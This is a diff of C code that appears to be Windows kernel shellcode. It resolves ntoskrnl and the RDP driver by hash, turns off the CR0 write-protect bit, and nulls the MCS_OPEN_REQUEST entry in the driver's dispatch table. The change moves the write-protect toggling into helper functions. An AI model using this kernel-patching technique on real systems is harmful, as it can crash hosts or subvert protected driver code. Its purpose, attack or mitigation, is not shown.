@@ -18,7 +18,7 @@
  *
 *********************************************************/
 #define _WIN32_LEAN_AND_MEAN
-#include <windows.h>
+#include <intrin.h>
 #include "common.h"
 
 #define MCS_OPEN_REQUEST 39
@@ -26,6 +26,16 @@
 #define H_NTOSKRNL 0x815d3210
 #define H_RDPWD    0x8b39664d
 #define H_RDATA    0x38b2f949
+
+VOID __forceinline DisableRo( VOID ) {
+	__asm__ __volatile__( "cli\n" );
+	__writecr0( __readcr0() & (~(1 << 16)) );
+};
+
+VOID __forceinline EnableRo( VOID ) {
+	__asm__ __volatile__( "sti\n" );
+	__writecr0( __readcr0() | (1 << 16) );
+};
 
 BOOL c_EntryPoint( VOID )
 {
@@ -54,13 +64,9 @@ BOOL c_EntryPoint( VOID )
 			   ) { DispatchTableEntry = SectionBegPointer; break; };
 		} while ( SectionLength-- != 0 && SectionBegPointer++ );
 
-		__asm__ __volatile__( "cli\n" );
-		__writecr0( __readcr0() & (~(1 << 16)));
-
-		DispatchTableEntry[ MCS_OPEN_REQUEST ] = ( LPVOID ) NULL;
-		
-		__writecr0( __readcr0() | (1 << 16));
-		__asm__ __volatile__( "sti\n" );
+		DisableRo(); 
+		DispatchTableEntry[ MCS_OPEN_REQUEST ] = ( LPVOID ) NULL; 
+		EnableRo();
 	};
 
 	return TRUE;
